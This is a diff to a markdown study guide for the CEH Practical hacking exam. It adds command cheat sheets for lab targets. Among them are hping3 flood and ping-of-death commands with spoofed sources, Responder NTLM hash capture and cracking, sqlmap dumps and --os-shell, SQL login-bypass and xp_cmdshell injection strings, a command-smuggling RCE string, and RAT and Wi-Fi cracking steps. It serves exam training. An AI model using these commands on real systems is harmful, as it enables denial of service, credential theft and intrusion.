@@ -69,15 +69,23 @@ Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.
 
 ## Nmap
 
-#### Identify the OS of the machine hosting a DB
+### Identify all active hosts in a network
+
+`nmap -sP <target_IP>/Subnet`
+
+### Do a Stelth Scan, Invading firewall, IDS/IPS
+
+`nmap -sS -p 80, 443 <target_IP>/Subnet`
+
+### Identify the OS of the machine hosting a DB
 
 To check target with open DB port (3306 or 1433): `nmap -sV IP/subnet` or `nmap -A IP/subnet` or `nmap -p3306,1433 IP/subnet` and check relative info about OS.
 
-#### Locate IP address of the machine with RDP open port
+### Locate IP address of the machine with RDP open port
 
-`nmap -Pn -p -sV 3389 IP`
+`nmap -Pn -p -sV 3389 <target_IP>`
 
-#### Find FQDN of domain controller <a href="#effd" id="effd"></a>
+### Find FQDN of domain controller <a href="#effd" id="effd"></a>
 
 FQDN (**FQDN = Hostname + Domain**) an example can be: mail.example.com mail (hostname), example.com (domain).
 
@@ -87,27 +95,35 @@ Scan subnet or target filtering for LDAP port (389):
 
 or
 
-* `nmap -p389 -sV IP`
+* `nmap -p389 -sV <target_IP>`
+
+or
+
+* `nmap -p 389 --script ldap-rootdse <target_IP>`
 
 Running nmap command we'll retrieve info about Domain and Host name:
 
 * Domain: <mark style="color:orange;">pentester.team</mark> Service Info: Host: <mark style="color:blue;">DC</mark>;
 * then FQDN = <mark style="color:blue;">DC</mark>.<mark style="color:orange;">pentester.team</mark>
 
-#### Indetify the number of hosts that are alive
+### Identify the number of hosts that are alive
 
 to checks hosts up: `nmap -sn IP/Subnet`
 
+### Identify potential vulnerabilities of services
+
+* `nmap -Pn --script vuln <target_IP>`
+
 ## WireShark
 
-#### Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file?&#x20;
+### Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file?&#x20;
 
 **To find DOS (SYN and ACK) :**&#x20;
 
 * statistic -> IPv4 statistics -> source and destination address
 * filter using: `tcp.flags.syn == 1 , tcp.flags.syn == 1 and tcp.flags.ack == 0`
 
-#### Analyze the pcap file and determine the number of machines that were involved in DDOS attack
+### Analyze the pcap file and determine the number of machines that were involved in DDOS attack
 
 * statistic -> IPv4 statistic -> source and destination address&#x20;
 
@@ -133,7 +149,35 @@ get the statistics of ipv4 -> we can see that Packets B -> A are null, because t
 
 To find DOS -> Look for Red and Black packets with around 1-2 simple packets in between and then pick any packet and check the Source and Destination IP with port if need.
 
-#### Identify IoT Message and its Length using capture.cap
+### SYN DDOS Attack using Hping
+
+`hping3 -S 1.1.1.6 -a 1.1.1.3 -p 22 --flood`
+
+> 1.1.1.6 is target IP
+>
+> 1.1.1.3 is the spoof IP
+>
+> 22 is port number.
+
+### POD - Ping of Death Attack
+
+`hping3 -d 65538 -S -p 21 --flood 1.1.1.6`&#x20;
+
+> \-d is data size
+>
+> \-S is syn packets
+>
+> \-p is port (you can flood any app with open ports.
+
+### UDP Flood attack
+
+`hping3 -2 -p 139 --flood 1.1.1.6`
+
+> \-2 is for UDP
+>
+> \-p is port
+
+### Identify IoT Message and its Length using capture.cap
 
 * Filter .cap file on wireshark with 'MQTT' filter
 * Select packet related to Publish Message
@@ -153,19 +197,29 @@ Use BCTextEncoder to decrypt the encoded secret file, psw can be the same of SMB
 [bctextencoder.md](../tools/bctextencoder.md)
 {% endcontent-ref %}
 
+### LLMNR Poisoning NTML Hash cracking
+
+Responder:  `responder -I eth0 -rdwv`
+
+Copy the hash from responder to ntlmhash.txt
+
+and crack it using Hashcat or John
+
 ## Hashcat
 
 * `hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0`
+* `hashcat -m 5600 ntlmhash.txt /usr/share/wordlists/rockyou.txt`
 
 > MD5 hash mode -a 0:
 >
 > Dictionary attack mode hash.txt txt file containing hash in a compliant format passwordlist.txt: dictionary file containing passwords in plain text
 
-### John the Ripper
+## John the Ripper
 
 * `john —format-raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`&#x20;
+* `john /usr/share/responder/logs/SMB-NTLMv2-SSP-1.1.15.txt`
 
-### Hydra
+## Hydra
 
 ### Crack the FTP credentials to obtain file stored into FTP server an enter the content as the answer
 
@@ -200,9 +254,9 @@ smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
 * We've three elf files, now we need to calcolate entropy for each of them using this command: `ent file.elf`
 * After selecting file.elf with highest entropy, we need to calculate hash of SHA 384: `sha384sum file.elf` and consider only the last 4 digits of the hash result.
 
-### **SQLMap**
+## **SQLMap**
 
-#### **Finding vulnerable site**
+### **Finding vulnerable site**
 
 * site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?=&#x20;
 
@@ -212,7 +266,7 @@ smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
 * `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart –tables   (tables)`
 * `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users --columns   (columns)`
 
-#### Dump whole table
+### Dump whole table
 
 * `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users  --dump`&#x20;
 
@@ -223,22 +277,41 @@ smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'
 * `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users -C uname  --dump` &#x20;
 * `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users -C pass  --dump`
 * `sqlmap -u "http://vmw.moviescope.com/viewprofile.aspx?id=l" —dbs [ Copy the cookie from website, mysql -U qdpmadmin -h 192.168.1.8 -P passwod [ If you have logins credentioals I`&#x20;
+* `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --dbs`
+* Get list of tables -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql --tables`
+* Dump data from tables -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql -T db --dump`
+* Get OS shell -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --os-shell`
 
-### Snow
+### Perform an SQL injection attack on web application and retrieve psw of user Mario (you just know these credentials maria:ferrari10)
+
+* If we just know crediantials (how our case) login, otherwise we need to bypass login putting into username box: `user' OR 1=1 --` and into psw a random text
+* Click on view profile (../viewprofile.aspx?id=1). There, we can use IDOR vulnerability (manipulating =id value) and seeing info regarding another user. In alternative we can use SQLMap to dump user info.
+
+## Snow
 
 * `snow.exe -C -p “password” stegfile.txt`
 
-### CrypTool <a href="#effd" id="effd"></a>
+## OpenStego
 
-#### Can you decrypt the file and provide the contents of "flag1.txt" as the answer? <a href="#effd" id="effd"></a>
+### Analyze the image file and extract the sensitive data hidden in the file
+
+* Use OpenStego on Windows
+* Select Extract Data
+* Upload file and select path of destination
+* Insert how psw a potential keyword present into question
+* Click to Extract Data
+
+## CrypTool <a href="#effd" id="effd"></a>
+
+### Can you decrypt the file and provide the contents of "flag1.txt" as the answer? <a href="#effd" id="effd"></a>
 
 * Connect to ftp using cmd: `ftp IP` &#x20;
 * After connect with FTP go to the file: `get file.txt` `get file1.txt`
 * Decrypt file: open CrypTool program -> Encrypt/Decrypt -> Symmetric (modern) -> DES (ECB)
 
-### WPSCAN
+## WPSCAN
 
-#### Identify psw associated with the User ID "sarah" and resolve the issue to allow her to access her account again. <a href="#effd" id="effd"></a>
+### Identify psw associated with the User ID "sarah" and resolve the issue to allow her to access her account again. <a href="#effd" id="effd"></a>
 
 * `wpscan --url http://192.168.1.10:8080/CEH -u sarah -P passwdlist.txt`
 
@@ -255,18 +328,24 @@ set TARGETURI http://10.10.10.10:8080/
 set USERNAME admin
 ```
 
-### Hashes.com <a href="#effd" id="effd"></a>
+## Hashes.com <a href="#effd" id="effd"></a>
 
-#### Decrypt/Crack the MD5 hash present into a website <a href="#effd" id="effd"></a>
+### Decrypt/Crack the MD5 hash present into a website <a href="#effd" id="effd"></a>
 
 A file called "Secrethash.txt" has been uploaded via DVWA at http://192.168.1.10:8080/DVWA. The file is located at the following path: C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt. Your task is to crack the MD5 hash present in the file and reveal the original message. You can access the file by logging into DVWA using the provided credentials: superuser::superman.&#x20;
 
 * Got to the site, login, go to the url uploads/Secret-hash.txt
 * Decrypt file using this web tool: https://hashes.com/en/decrypt/hash
 
-### RDP <a href="#effd" id="effd"></a>
+## RDP <a href="#effd" id="effd"></a>
 
-#### Find secret number hidden inside the file located in a directory (accessible using RDP) <a href="#effd" id="effd"></a>
+#### Connect to RDP port <a href="#effd" id="effd"></a>
+
+```bash
+xfreerdp /v:<Target_IP> /u:Administrator
+```
+
+### Find secret number hidden inside the file located in a directory (accessible using RDP) <a href="#effd" id="effd"></a>
 
 A file named "Secret.txt" that has been concealed within the Server 2019 machine is located at the following path: C:\Users\Dell\Documents\Confidential.
 
@@ -278,11 +357,11 @@ Your objective is to find the secret number hidden inside the file and provide i
 * Browse to the mentioned path C:\Users\Dell\Documents\Confidential
 * Open "Secret.txt" file and copy the number inside.
 
-#### Find suspicious account? You've a credential of one user, you can use RDP to log in e found suspicious account (port 3389). <a href="#effd" id="effd"></a>
+### Find suspicious account? You've a credential of one user, you can use RDP to log in e found suspicious account (port 3389). <a href="#effd" id="effd"></a>
 
 * Opening cmd and use: `net user` command.&#x20;
 
-#### Check phone number of Maria <a href="#effd" id="effd"></a>
+### Check phone number of Maria <a href="#effd" id="effd"></a>
 
 A site has SQLi vulnerability, the cookie information is stored in a text file in the Documents folder of the EH-2 machine. Use the SQL DSSS attack method to capture the session link. Determine the contact number of Maria associated twith a website.
 
@@ -292,7 +371,7 @@ A site has SQLi vulnerability, the cookie information is stored in a text file i
 
 If you get any questions related to netbios, SMB use metasploit.
 
-### SMB
+## SMB
 
 #### Nmap
 
@@ -387,29 +466,61 @@ ls
 get <filename>
 ```
 
-### Veracrypt
+## Malware Analysis
 
-\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
+### Identify malware entry point address
 
+#### Detect it easy
 
+* Execute Detect it easy client tool
+* Upload malware executable
+* Click to File info
+* See entry point address
 
+or using PEiD or PE Explorer tools
 
+### Retrieve file connecting to RAT installed into victim machine
 
-### Other useful tools
+#### ProRat
 
-* Veracrypt
-* Crypttool&#x20;
-* Hash Calculator&#x20;
-* MD5 Calculator&#x20;
-* Hashcalc
-* Hashcat
-* John
-* BCTextEncoder
-* PhoneSploit&#x20;
-* NMAP
-* Dirb&#x20;
-* Steghide
-* Searchsploit &#x20;
+* Execute ProRat
+* Set victim IP and relative port 5110
+* Click to connect and search files.
+
+#### Theef
+
+* Execute Theef
+* Set victim IP and relative ports to 6703 and 2968 (or custom port)
+* Click to connect and open file manger.
+
+NjRat
+
+* Execute NjRat
+* Insert IP and Port
+* Click on manager and open directory
+
+## Aircrack-ng
+
+### Crack the wireless encryption and identify the Wi-Fi password
+
+**1st tentative:** `aircrack-ng pcapfile` (usually works only for WEP encryption)
+
+**2nd tentative**: `aircrack-ng -w passwordlist pcapfile`
+
+**3rd tentative**: adding BSSID (-b flag): `aircrack-ng -b BSSID -w passwordlist pcapfile` (To find BSSID: on Wireshark click on packet, search BSSID and copy value)
+
+## Veracrypt
+
+### Access the Veracrypt volume, and find the secret code
+
+* Decrypt password needed to access to volume
+* Access to encrypted Drive (C:) using password decrypted into Veracrypt
+* Find secret code file stored into C Drive.
+
+Download file from FTP
+
+* `wget -m ftp://anonymous:anonymous@<ip>`
+* `wget -m --no-passive ftp://anonymous:anonymous@<ip>`
 
 ### Basic Windows cmd 🪟
 
@@ -533,11 +644,201 @@ search -f flag.txt
 
 ## Others <a href="#effd" id="effd"></a>
 
+```
+>>>Module 02 : Enumeration 
+------------------------------------------------------
+ping www.moviescope.com –f –l 1500 -> Frame size
+tracert www.moviescope.com -> Determining hop count
+
+------------------------------------------------------
+>>Enumeration using Metasploit :
+------------------------------------------------------
+msfdb init
+service postgresql start
+msfconsole
+msf > db_status
+nmap -Pn -sS -A -oX Test 10.10.10.0/24
+db_import Test
+hosts -> To show all available hosts in the subnet
+db_nmap -sS -A 10.10.10.16 -> To extract services of particular machine
+services -> to get all available services in a subnet
+
+------------------------------------------------------
+>>SMB Version Enumeration using MSF
+------------------------------------------------------
+use scanner/smb/smb_version
+set RHOSTS 10.10.10.8-16
+set THREADS 100
+run
+hosts -> now exact os_flavor information has been updated
+
+------------------------------------------------------
+>>Module 03 : Scanning Networks
+------------------------------------------------------
+Port Scanning using Hping3:
+hping3 --scan 1-3000 -S 10.10.10.10
+--scan parameter defines the port range to scan and –S represents SYN flag.
+
+Pinging the target using HPing3:
+hping3 -c 3 10.10.10.10
+-c 3 means that we only want to send three packets to the target machine.
+
+UDP Packet Crafting
+hping3 10.10.10.10 --udp --rand-source --data 500
+
+TCP SYN request
+hping3 -S 10.10.10.10 -p 80 -c 5-S will perform TCP SYN request on the target machine, -p will pass the traffic through which port is assigned, and -c is the count of the packets sent to the Target machine.
+
+HPing flood
+hping3 10.10.10.10 --flood
+
+------------------------------------------------------
+>>>Module 04 : Enumeration
+------------------------------------------------------
+
+>>SNMP Enumeration
+nmap –sU –p 161 10.10.10.12
+nmap -sU -p 161 --script=snmp-brute 10.10.10.12
+msfconsole
+use auxiliary/scanner/snmp/snmp_login
+set RHOSTS and exploit
+use auxiliary/scanner/snmp/snmp_enum
+set RHOSTS and exploit
+
+
+snmp-check <IP address>
+------------------------------------------------------
+>>NetBIOS Enumeration (139) : 
+------------------------------------------------------
+nbtstat –A 10.10.10.16
+net use
+net use \10.10.10.16\e ““\user:””
+net use \10.10.10.16\e ““/user:””
+NetBIOS Enumerator
+
+------------------------------------------------------
+>>Enum4Linux Wins Enumeration :
+------------------------------------------------------
+
+enum4linux -u martin -p apple -U 10.10.10.12 -> Users Enumeration
+enum4linux -u martin -p apple -o 10.10.10.12 -> OS Enumeration
+enum4linux -u martin -p apple -P 10.10.10.12 -> Password Policy Information
+enum4linux -u martin -p apple -G 10.10.10.12 -> Groups Information
+enum4linux -u martin -p apple -S 10.10.10.12 -> Share Policy Information (SMB Shares Enumeration)
+
+------------------------------------------------------
+>>Active Directory LDAP Enumeration : ADExplorer
+------------------------------------------------------
+
+------------------------------------------------------
+>>Module 05 : Vulnerability Analysis 
+------------------------------------------------------
+nikto -h http://www.goodshopping.com -Tuning 1 
+Nessus runs on  https://localhost:8834Username: admin Password: password
+Nessus -> Policies > Advanced scan
+Discovery > Host Discovery > Turn off Ping the remote host
+Port Scanning > check the Verify open TCP ports found by local port enumerators
+AdvancedMax number of TCP sessions per host and = unlimitedMax number of TCP sessions per scan = unlimited
+Credentials > Windows > Username & Password
+Save policy > Create new scan > User Defined
+Enter name & Target
+Schedule tab > Turn of Enabled
+Hit launch from drop-down of save.
+
+------------------------------------------------------
+>>>>Module 06 : System Hacking
+------------------------------------------------------
+>>NTLM Hash crack :
+responder -I eth0
+usr\share\responder\logs --> Responder log location
+john /usr/share/responder/logs/ntlm.txt
+
+
+>>Rainbowtable crack using Winrtgen :
+
+Open winrtgen and add new table
+Select ntlm from Hash dropdown list.
+Set Min Len as 4, Max Len as 6 and Chain Count 4000000
+Select loweralpha from Charset dropdown list (it depends upon Password).
+rcrack_gui.exe to crack hash with rainbow table
+
+>>Hash dump with Pwdump7 and crack with ohpcrack :
+
+wmic useraccount get name,sid --> Get user acc names and SID
+PwDump7.exe > c:\hashes.txt
+Replace boxes in hashes.txt with relevant usernames from step 1.
+Ophcrack.exe -> load -> PWDUMP File
+Tables -> Vista free -> select the table directory -> crack
+
+------------------------------------------------------
+>>Module 08 : Sniffing
+------------------------------------------------------
+
+http.request.method == “POST” -> Wireshark filter for filtering HTTP POST request 
+Capture traffic from remote interface via wireshark
+Capture > Options > Manage Interfaces 
+Remote Interface > Add > Host &  Port (2002)
+Username & password > Start
+
+------------------------------------------------------
+>>>Module 13 : Hacking Web Servers
+------------------------------------------------------
+FTP Bruteforce with Hydra
+hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://10.10.10.11
+
+>>Module 14 : Hacking Web Applications
+
+Wordpress
+wpscan --url http://10.10.10.12:8080/CEH --enumerate u
+
+(--api-token <API Token>)
+
+WP password bruteforce
+msfconsoleuse auxiliary/scanner/http/wordpress_login_enum
+
+RCE 
+ping 127.0.0.1 | hostname | net user
+
+------------------------------------------------------
+>>>>Module 15 : SQL Injection
+------------------------------------------------------
+SQLMAP Extract DBS
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" --dbs
+
+Extract Tables
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope --tables
+
+Extract Columns
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --columns
+
+Dump Data
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" -D moviescope -T User_Login --dump
+
+OS Shell to execute commands
+sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="cookies xxx" --os-shell
+
+Login bypass
+blah' or 1=1 --
+
+Insert data into DB from login
+blah';insert into login values ('john','apple123');
+
+Create database from login
+blah';create database mydatabase;
+
+Execute cmd from login
+blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+```
+
+{% embed url="https://adithyanak.gitbook.io/ceh-practical/" %}
+
+{% embed url="https://github.com/dhabaleshwar/CEHPractical" %}
+
 <details>
 
 <summary>Others</summary>
 
-### Tips <a href="#91e1" id="91e1"></a>
+### Tips <a href="#id-91e1" id="id-91e1"></a>
 
 _1) First finish linux based questions like nmap etc and save those in the desktop folder, believe me you will look into the nmap scans over and over again._\
 _2) Watch the ilab videos from youtube and reffer CEH practical Lab manual._\
@@ -566,3 +867,4 @@ Your exam computers won't have regular internet access. You need to use your web
 * Scan all ports on IPs because default scripts might not catch smart configurations.
 
 </details>
+
